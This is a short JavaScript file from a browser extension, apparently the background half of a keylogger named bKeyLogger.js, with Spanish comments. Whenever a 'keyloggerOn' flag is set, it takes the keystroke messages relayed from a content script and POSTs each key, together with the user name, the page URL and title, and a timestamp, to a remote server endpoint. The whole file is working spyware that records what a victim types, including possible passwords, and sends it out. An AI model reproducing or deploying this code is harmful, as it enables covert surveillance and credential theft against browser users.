console.log("bKeyLogger.js esta corriendo");

detectBrowser.runtime.onMessage.addListener(inputKeyStroke);

//recive info for content.js
function inputKeyStroke(mensaje,sender,sendResponse){
 
    if(keyloggerOn){

        if(mensaje.txt === "keydown" || mensaje.txt === "keypress" ){
            let timestamp = new Date();
            timestamp.getDate();
            //save key
            //console.log(mensaje);

            var requestKey = new XMLHttpRequest();
            requestKey.open("POST", urlServer+"/key", true);
            requestKey.setRequestHeader("Content-Type", "application/json;charset=UTF-8");
            requestKey.send(JSON.stringify({
                    "userName": user,
                    "url": sender.tab.url,
                    "title" : sender.tab.title,
                    "type" : mensaje.txt,
                    "keyCode" : mensaje.keyCode,
                    "charCode" : mensaje.charCode,
                    "wich" : mensaje.wich,
                    "chr" : mensaje.chr,
                    "time": timestamp
            }));
            
        }

    }

}